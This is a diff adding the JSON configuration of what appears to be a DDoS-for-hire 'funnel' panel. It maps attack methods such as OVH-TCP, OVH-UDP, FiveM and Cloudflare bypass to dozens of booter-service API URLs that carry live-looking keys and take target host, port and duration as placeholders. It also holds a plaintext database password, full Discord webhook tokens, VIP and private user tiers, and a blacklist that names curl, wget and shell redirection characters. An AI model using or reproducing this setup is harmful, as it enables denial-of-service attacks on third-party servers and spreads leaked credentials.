@@ -1,0 +1,428 @@
+{
+    "webserver": {
+        "host": "127.0.0.1",
+        "debug": true,
+        "enabled": true
+    },
+    "database": {
+        "host": "localhost:3306",
+        "username": "admin",
+        "password": "meow123",
+        "table": "funnel"
+    },
+    "webhooks": {
+        "telegram": {
+            "attack_sent": {
+                "token": "",
+                "title": "USER ATTACK SENT SUCCESSFULLY",
+                "chat_id": "",
+                "enabled": false
+            },
+            "blacklisted_host": {
+                "token": "",
+                "title": "USER TRIED ATTACKING BLACKLIST",
+                "chat_id": "",
+                "enabled": false
+            }
+        },
+        "discord": {
+            "attack_sent": {
+                "webhook": "https://discord.com/api/webhooks/1017881046185943120/zskpzXn6LaAjgcYNi0CD2NetOhTlSSVnPBMS9x3syFCt9gDxrnpPuU3wzkJ8DefkAwRE",
+                "title": "Success",
+                "image": "",
+                "hex_color": "",
+                "enabled": true
+            },
+            "blacklisted_host": {
+                "webhook": "https://discord.com/api/webhooks/1017881046185943120/zskpzXn6LaAjgcYNi0CD2NetOhTlSSVnPBMS9x3syFCt9gDxrnpPuU3wzkJ8DefkAwRE",
+                "title": "Blacklisted target",
+                "hex_color": "",
+                "enabled": true
+            }
+        }
+    },
+    "attack_settings": {
+        "blacklists": [
+            ".gov",
+            ".edu",
+            "curl",
+            ".ru",
+            "russia",
+            "wget",
+            "1.1.1.1",
+            ">",
+            "<",
+            "echo",
+            "insert",
+            "mysql",
+            "localhost",
+            "109.206.241.211",
+            "8.8.8.8",
+            "cat",
+            "kitten",
+            "komaru",
+            "kitty"
+        ],
+        "attacks": {
+            "enabled": true,
+            "slots": {
+                "max": 4,
+                "enabled": true
+            },
+            "powersaving": {
+                "enabled": false
+            },
+            "spamcheck": {
+                "general": {
+                    "amount": 3,
+                    "per_seconds": 300,
+                    "enabled": false
+                },
+                "target": {
+                    "amount": 3,
+                    "per_seconds": 300,
+                    "enabled": false
+                }
+            }
+        }
+    },
+    "attacks": [
+        {
+            "name": "HOME",
+            "links": [
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=MIXAMP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=MIXAMP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=MIXAMP"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "root",
+                            "mypartner"
+                        ]
+                    }
+                }
+            }
+        },
+                        {
+            "name": "FIVEM",
+            "links": [
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=FIVEM",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=FIVEM",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=FIVEM",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=FIVEM",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=FIVEM",
+                "http://nigga.sbs/api/attack?username=corset&secret=crack&host={HOST}&port={PORT}&time={TIME}&method=FIVEM"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": true,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "root",
+                            "mypartner"
+                        ]
+                    }
+                }
+            }
+        },
+                {
+            "name": "OVHTCP",
+            "links": [
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "http://nigga.sbs/api/attack?username=corset&secret=crack&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://liquidproxy.cf/api/attack?username=LiquidCnC&secret=cNcCnC&target={HOST}&port={PORT}&time={TIME}&method=OVH-VIP"
+                
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": true,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "root",
+                            "mypartner"
+                        ]
+                    }
+                }
+            }
+        },
+                        {
+            "name": "OVH-VIP",
+            "links": [
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "http://nigga.sbs/api/attack?username=corset&secret=crack&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://liquidproxy.cf/api/attack?username=LiquidCnC&secret=cNcCnC&target={HOST}&port={PORT}&time={TIME}&method=OVH-VIP"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": true,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "root",
+                            "mypartner"
+                        ]
+                    }
+                }
+            }
+        },
+        
+                {
+            "name": "OVHUDP",
+            "links": [
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-UDP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-UDP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-UDP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-UDP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-UDP",
+                "http://nigga.sbs/api/attack?username=corset&secret=crack&host={HOST}&port={PORT}&time={TIME}&method=OVH-UDP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHUDP"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": true,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "root",
+                            "mypartner"
+                        ]
+                    }
+                }
+            }
+        },
+                        {
+            "name": "OVH-PRIVATE",
+            "links": [
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "http://nigga.sbs/api/attack?username=corset&secret=crack&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=LsXlQ5KGxFEj&type=L4&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.brrsecurity.org/?key=ymmyTMjMBjk4On9n&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": true,
+                    "private": {
+                        "enabled": true,
+                        "users": [
+                            "komarugato",
+                            "black"
+                        ]
+                    }
+                }
+            }
+        },
+                {
+            "name": "CFPRO",
+            "links": [
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=CF-PRO",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=CF-PRO",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=CF-PRO",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=CF-PRO",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=CF-PRO",
+                "http://nigga.sbs/api/attack?username=corset&secret=crack&host={HOST}&port={PORT}&time={TIME}&method=CLOUDFLARE",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=HTTPSOCKET"
+            ],
+            "config": {
+                "slots": {
+                    "max": 2,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": true,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "root",
+                            "mypartner"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "name": "HTTPS",
+            "links": [
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+                "https://api.brrsecurity.org/?key=Xi0Jts2Pmc5ZkAoN&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+                "https://api.cyberstress.us?token=JAEfy9SyK7P6N3XKsWb5Us&host={HOST}&port={PORT}&time={TIME}&method=HTTPSOCKET"
+            ],
+            "config": {
+                "slots": {
+                    "max": 2,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": {
+                        "enabled": true,
+                        "users": [
+                            "kingcobra",
+                            "johnthegoat"
+                        ]
+                    }
+                }
+            }
+        }
+    ]
+}
